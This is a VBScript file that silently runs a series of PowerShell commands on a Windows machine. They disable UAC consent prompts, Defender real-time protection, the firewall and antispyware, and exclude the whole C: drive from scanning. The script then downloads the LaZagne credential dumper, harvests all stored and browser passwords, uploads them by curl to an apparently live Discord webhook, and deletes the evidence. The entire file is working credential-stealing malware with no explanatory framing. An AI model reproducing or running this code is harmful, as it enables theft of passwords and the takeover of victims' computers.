Dim WshShell
Set WshShell = CreateObject("WScript.Shell")
Dim logFile
logFile = WshShell.ExpandEnvironmentStrings("%TEMP%\script_log.txt")

Function RunCommand(command)
    WshShell.Run command & " >> """ & logFile & """ 2>&1", 0, True ' Redirecting stdout and stderr to logFile
    WScript.Sleep 3000 ' Wait for 3 seconds
End Function

' First PowerShell Command
RunCommand "powershell -command Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0"

' Second PowerShell Command
RunCommand "powershell -command Set-MpPreference -DisableRealtimeMonitoring $true"

' Third PowerShell Command
RunCommand "powershell -command Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False"

' Fourth PowerShell Command
RunCommand "powershell -command New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force"

' Fifth PowerShell Command
RunCommand "powershell -command Add-MpPreference -ExclusionPath 'C:'"

' Sixth PowerShell Command (Downloading and executing LaZagne)
RunCommand "powershell -command ""$Test = [System.Environment]::GetEnvironmentVariable('TEMP','Machine'); Start-BitsTransfer -Source 'https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe' -Destination ($Test + '\l.exe'); cd $Test"""


' Seventh PowerShell Command (Using LaZagne and then sending data)
RunCommand "powershell -command ""$Test = [System.Environment]::GetEnvironmentVariable('TEMP','Machine'); .\l.exe all -vv > ($Test + '\' + $env:computername + '.txt'); .\l.exe browsers -vv >> ($Test + '\' + $env:computername + '.txt'); curl.exe https://discord.com/api/webhooks/1149586378645057587/tSeQHB9SZCwTwbvNWxCLfCEQPr-7gM_IwjS588pOfWSPjxQ4A4AZWgF748CliszTnkAM -F ('file1=@' + $Test + '/' + $env:computername + '.txt'); Remove-Item ($Test + '\' + $env:computername + '.txt'), ($Test + '\l.exe') -Force -ErrorAction SilentlyContinue"""

